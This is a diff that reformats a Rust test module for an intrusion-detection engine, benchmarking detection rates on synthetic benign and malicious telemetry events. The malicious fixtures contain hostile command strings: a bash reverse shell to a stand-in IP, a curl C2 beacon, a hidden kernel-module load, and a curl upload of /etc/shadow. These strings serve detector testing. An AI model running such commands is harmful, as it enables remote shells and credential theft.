@@ -31,22 +31,22 @@ mod tests {
             pid,
             ppid: 1,
             uid: 1000,
-        process: "ls".to_string(),
-        parent_process: "bash".to_string(),
-        session_id: 1,
-        file_path: Some("/usr/bin/ls".to_string()),
-        file_write: false,
-        file_hash: None,
-        dst_port: None,
-        dst_ip: None,
-        dst_domain: None,
-        command_line: Some("ls -la /home/user/documents".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "ls".to_string(),
+            parent_process: "bash".to_string(),
+            session_id: 1,
+            file_path: Some("/usr/bin/ls".to_string()),
+            file_write: false,
+            file_hash: None,
+            dst_port: None,
+            dst_ip: None,
+            dst_domain: None,
+            command_line: Some("ls -la /home/user/documents".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     fn benign_network(ts: i64, pid: u32) -> TelemetryEvent {
@@ -56,22 +56,22 @@ mod tests {
             pid,
             ppid: 1,
             uid: 1000,
-        process: "curl".to_string(),
-        parent_process: "bash".to_string(),
-        session_id: 1,
-        file_path: None,
-        file_write: false,
-        file_hash: None,
-        dst_port: Some(443),
-        dst_ip: Some("142.250.80.46".to_string()), // google.com
-        dst_domain: Some("www.google.com".to_string()),
-        command_line: Some("curl https://www.google.com".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "curl".to_string(),
+            parent_process: "bash".to_string(),
+            session_id: 1,
+            file_path: None,
+            file_write: false,
+            file_hash: None,
+            dst_port: Some(443),
+            dst_ip: Some("142.250.80.46".to_string()), // google.com
+            dst_domain: Some("www.google.com".to_string()),
+            command_line: Some("curl https://www.google.com".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     fn benign_file_op(ts: i64, pid: u32) -> TelemetryEvent {
@@ -81,22 +81,22 @@ mod tests {
             pid,
             ppid: 1,
             uid: 1000,
-        process: "vim".to_string(),
-        parent_process: "bash".to_string(),
-        session_id: 1,
-        file_path: Some("/home/user/notes.txt".to_string()),
-        file_write: true,
-        file_hash: None,
-        dst_port: None,
-        dst_ip: None,
-        dst_domain: None,
-        command_line: Some("vim /home/user/notes.txt".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "vim".to_string(),
+            parent_process: "bash".to_string(),
+            session_id: 1,
+            file_path: Some("/home/user/notes.txt".to_string()),
+            file_write: true,
+            file_hash: None,
+            dst_port: None,
+            dst_ip: None,
+            dst_domain: None,
+            command_line: Some("vim /home/user/notes.txt".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     /// Reverse shell — detection should come from Aho-Corasick string
@@ -109,23 +109,23 @@ mod tests {
             pid,
             ppid: 1,
             uid: 0,
-        process: "bash".to_string(),
-        parent_process: "python3".to_string(),
-        session_id: 1,
-        file_path: Some("/bin/bash".to_string()),
-        file_write: false,
-        file_hash: None,
-        dst_port: Some(4444),
-        // Novel IP — not in any IOC list
-        dst_ip: Some("198.51.100.77".to_string()),
-        dst_domain: None,
-        command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "bash".to_string(),
+            parent_process: "python3".to_string(),
+            session_id: 1,
+            file_path: Some("/bin/bash".to_string()),
+            file_write: false,
+            file_hash: None,
+            dst_port: Some(4444),
+            // Novel IP — not in any IOC list
+            dst_ip: Some("198.51.100.77".to_string()),
+            dst_domain: None,
+            command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     /// Obfuscated payload — detection relies on entropy analysis + ML
@@ -166,23 +166,23 @@ mod tests {
             pid,
             ppid: 1,
             uid: 0,
-        process: "curl".to_string(),
-        parent_process: "cron".to_string(),
-        session_id: 1,
-        file_path: None,
-        file_write: false,
-        file_hash: None,
-        dst_port: Some(53),
-        dst_ip: None,
-        // Novel domain — not in IOC list
-        dst_domain: Some("x7f3a2b.dynamic-dns.net".to_string()),
-        command_line: Some("curl -s https://x7f3a2b.dynamic-dns.net/c2/poll".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "curl".to_string(),
+            parent_process: "cron".to_string(),
+            session_id: 1,
+            file_path: None,
+            file_write: false,
+            file_hash: None,
+            dst_port: Some(53),
+            dst_ip: None,
+            // Novel domain — not in IOC list
+            dst_domain: Some("x7f3a2b.dynamic-dns.net".to_string()),
+            command_line: Some("curl -s https://x7f3a2b.dynamic-dns.net/c2/poll".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     /// Kernel module load — detection via string sigs ("insmod", ".ko")
@@ -194,22 +194,22 @@ mod tests {
             pid,
             ppid: 1,
             uid: 0,
-        process: "insmod".to_string(),
-        parent_process: "bash".to_string(),
-        session_id: 1,
-        file_path: Some("/tmp/.hidden/payload.ko".to_string()),
-        file_write: false,
-        file_hash: None,
-        dst_port: None,
-        dst_ip: None,
-        dst_domain: None,
-        command_line: Some("insmod /tmp/.hidden/payload.ko".to_string()),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "insmod".to_string(),
+            parent_process: "bash".to_string(),
+            session_id: 1,
+            file_path: Some("/tmp/.hidden/payload.ko".to_string()),
+            file_write: false,
+            file_hash: None,
+            dst_port: None,
+            dst_ip: None,
+            dst_domain: None,
+            command_line: Some("insmod /tmp/.hidden/payload.ko".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     /// Data exfiltration — novel target, detection via behavioral
@@ -221,24 +221,24 @@ mod tests {
             pid,
             ppid: 1,
             uid: 0,
-        process: "curl".to_string(),
-        parent_process: "bash".to_string(),
-        session_id: 1,
-        file_path: Some("/etc/shadow".to_string()),
-        file_write: false,
-        file_hash: None,
-        dst_port: Some(31337),
-        dst_ip: Some("198.51.100.99".to_string()),
-        dst_domain: None,
-        command_line: Some(
-            "curl -X POST -d @/etc/shadow https://198.51.100.99:31337/upload".to_string()
-        ),
-        event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
-    }
+            process: "curl".to_string(),
+            parent_process: "bash".to_string(),
+            session_id: 1,
+            file_path: Some("/etc/shadow".to_string()),
+            file_write: false,
+            file_hash: None,
+            dst_port: Some(31337),
+            dst_ip: Some("198.51.100.99".to_string()),
+            dst_domain: None,
+            command_line: Some(
+                "curl -X POST -d @/etc/shadow https://198.51.100.99:31337/upload".to_string(),
+            ),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
+        }
     }
 
     // ─── Full-Pipeline Benchmark ────────────────────────────────
@@ -299,8 +299,14 @@ mod tests {
         };
 
         println!("\n═══ Full-Pipeline Detection (zero planted IOCs) ═══");
-        println!("  Benign:     {benign_count} events, {benign_detected} flagged (FPR = {:.2}%)", fpr * 100.0);
-        println!("  Malicious:  {malicious_count} events, {malicious_detected} detected (TPR = {:.2}%)", tpr * 100.0);
+        println!(
+            "  Benign:     {benign_count} events, {benign_detected} flagged (FPR = {:.2}%)",
+            fpr * 100.0
+        );
+        println!(
+            "  Malicious:  {malicious_count} events, {malicious_detected} detected (TPR = {:.2}%)",
+            tpr * 100.0
+        );
         println!("  Precision:  {:.2}%", precision * 100.0);
         println!("  F1 Score:   {f1:.3}");
         println!("  Breakdown by type (detected / total 10 each):");
@@ -316,7 +322,11 @@ mod tests {
         // - ML meta-scoring (entropy, compression, event class risk)
         // - Behavioral CUSUM (entropy shift, root exec rate)
         // Even modest TPR here is honest — these are novel IOCs.
-        assert!(tpr >= 0.08, "TPR should be ≥ 8% without planted IOCs, got {:.1}%", tpr * 100.0);
+        assert!(
+            tpr >= 0.08,
+            "TPR should be ≥ 8% without planted IOCs, got {:.1}%",
+            tpr * 100.0
+        );
     }
 
     // ─── ML Scoring (honest: feed real signals, not planted) ────
@@ -357,8 +367,8 @@ mod tests {
             // - prefilter_hit might fire from Cuckoo bloom filter
             // - z3_anomaly_med from behavioral shift
             let signals = DetectionSignals {
-                z1_exact_ioc: false,     // NOT planted
-                z2_temporal: false,      // requires temporal warmup
+                z1_exact_ioc: false, // NOT planted
+                z2_temporal: false,  // requires temporal warmup
                 z3_anomaly_high: false,
                 z3_anomaly_med: i % 3 == 0, // occasional behavioral anomaly
                 z4_kill_chain: false,
@@ -383,7 +393,10 @@ mod tests {
 
         assert!(ml_benign_fp < 5, "ML FP rate too high: {ml_benign_fp}%");
         // Without z1_exact_ioc, TPR will be lower — this is honest
-        assert!(ml_malicious_tp > 30, "ML TP rate too low without IOC: {ml_malicious_tp}%");
+        assert!(
+            ml_malicious_tp > 30,
+            "ML TP rate too low without IOC: {ml_malicious_tp}%"
+        );
     }
 
     // ─── Information-Theoretic Obfuscation Detection ────────────
@@ -411,8 +424,10 @@ mod tests {
         ];
 
         println!("\n═══ Information-Theoretic Obfuscation Detection ═══");
-        println!("{:<25} {:>7} {:>7} {:>7} {:>7} {:>8}",
-            "Label", "H₁", "H₂", "H_∞", "CompR", "Flagged");
+        println!(
+            "{:<25} {:>7} {:>7} {:>7} {:>7} {:>8}",
+            "Label", "H₁", "H₂", "H_∞", "CompR", "Flagged"
+        );
 
         let mut tp = 0;
         let mut fp = 0;
@@ -424,24 +439,42 @@ mod tests {
             let bytes = cmd.as_bytes();
             let h1 = information::char_entropy(bytes);
             let spectrum = information::renyi_spectrum(bytes);
-            let h2 = spectrum.iter()
+            let h2 = spectrum
+                .iter()
                 .find(|(a, _)| (*a - 2.0).abs() < 0.01)
-                .map(|(_, h)| *h).unwrap_or(0.0);
+                .map(|(_, h)| *h)
+                .unwrap_or(0.0);
             let h_inf = spectrum.last().map(|(_, h)| *h).unwrap_or(0.0);
             let comp = information::compression_ratio(bytes);
 
             let detected = h1 > entropy_threshold && comp > compression_threshold;
 
-            if detected && *is_malicious { tp += 1; }
-            if detected && !is_malicious { fp += 1; }
+            if detected && *is_malicious {
+                tp += 1;
+            }
+            if detected && !is_malicious {
+                fp += 1;
+            }
 
-            println!("{:<25} {:>7.3} {:>7.3} {:>7.3} {:>7.3} {:>8}",
-                label, h1, h2, h_inf, comp,
-                if detected { "⚠ YES" } else { "  no" });
+            println!(
+                "{:<25} {:>7.3} {:>7.3} {:>7.3} {:>7.3} {:>8}",
+                label,
+                h1,
+                h2,
+                h_inf,
+                comp,
+                if detected { "⚠ YES" } else { "  no" }
+            );
         }
 
-        println!("\n  Entropy TP: {tp}/{} malicious", commands.iter().filter(|c| c.1).count());
-        println!("  Entropy FP: {fp}/{} benign", commands.iter().filter(|c| !c.1).count());
+        println!(
+            "\n  Entropy TP: {tp}/{} malicious",
+            commands.iter().filter(|c| c.1).count()
+        );
+        println!(
+            "  Entropy FP: {fp}/{} benign",
+            commands.iter().filter(|c| !c.1).count()
+        );
         assert!(fp == 0, "entropy should have 0 FP on benign commands");
     }
 
@@ -470,10 +503,16 @@ mod tests {
         println!("\n═══ CUSUM Detection Latency ═══");
         println!("  Actual delay:      {detection_delay} events");
         println!("  Lorden bound:      {theoretical_min:.1} events");
-        println!("  ARL₀:              {:.0} events", detector.estimated_arl0());
+        println!(
+            "  ARL₀:              {:.0} events",
+            detector.estimated_arl0()
+        );
 
         assert!(detection_delay > 0, "CUSUM should detect shift");
-        assert!(detection_delay < 10, "delay should be < 10: got {detection_delay}");
+        assert!(
+            detection_delay < 10,
+            "delay should be < 10: got {detection_delay}"
+        );
     }
 
     // ─── Concentration Bounds ───────────────────────────────────
@@ -506,10 +545,12 @@ mod tests {
     fn bench_conformal_prediction_coverage() {
         use crate::information::ConformalCalibrator;
 
-        let calibration: Vec<f64> = (0..1000).map(|i| {
-            let x = i as f64 / 1000.0;
-            x * x
-        }).collect();
+        let calibration: Vec<f64> = (0..1000)
+            .map(|i| {
+                let x = i as f64 / 1000.0;
+                x * x
+            })
+            .collect();
 
         let alpha = 0.01;
         let cal = ConformalCalibrator::new(calibration, alpha);
@@ -526,7 +567,10 @@ mod tests {
 
         println!("\n═══ Conformal Prediction ═══");
         println!("  Guarantee:  P(covered) ≥ {:.0}%", (1.0 - alpha) * 100.0);
-        println!("  Empirical:  {:.1}% ({covered}/{test_count})", empirical * 100.0);
+        println!(
+            "  Empirical:  {:.1}% ({covered}/{test_count})",
+            empirical * 100.0
+        );
         println!("  Threshold:  {:.6}", cal.threshold);
 
         assert!(empirical >= 1.0 - alpha - 0.05);
@@ -540,8 +584,8 @@ mod tests {
         use crate::information::{kl_divergence, wasserstein_1};
 
         let baseline = vec![0.5, 0.3, 0.15, 0.04, 0.01];
-        let subtle   = vec![0.45, 0.28, 0.17, 0.07, 0.03];
-        let attack   = vec![0.1, 0.15, 0.25, 0.3, 0.2];
+        let subtle = vec![0.45, 0.28, 0.17, 0.07, 0.03];
+        let attack = vec![0.1, 0.15, 0.25, 0.3, 0.2];
         let disjoint = vec![0.0, 0.0, 0.0, 0.3, 0.7];
 
         let w_s = wasserstein_1(&baseline, &subtle);
@@ -621,10 +665,10 @@ mod tests {
                 dst_domain: None,
                 command_line: Some("ls -la /home/user/documents/work".to_string()),
                 event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
+                container_runtime: None,
+                container_id: None,
+                container_escape: false,
+                container_privileged: false,
             };
             normal_alarms += engine.observe(&event).len();
         }
@@ -650,10 +694,10 @@ mod tests {
                 dst_domain: None,
                 command_line: Some(obfuscated.to_string()),
                 event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
+                container_runtime: None,
+                container_id: None,
+                container_escape: false,
+                container_privileged: false,
             };
             attack_alarms += engine.observe(&event).len();
         }
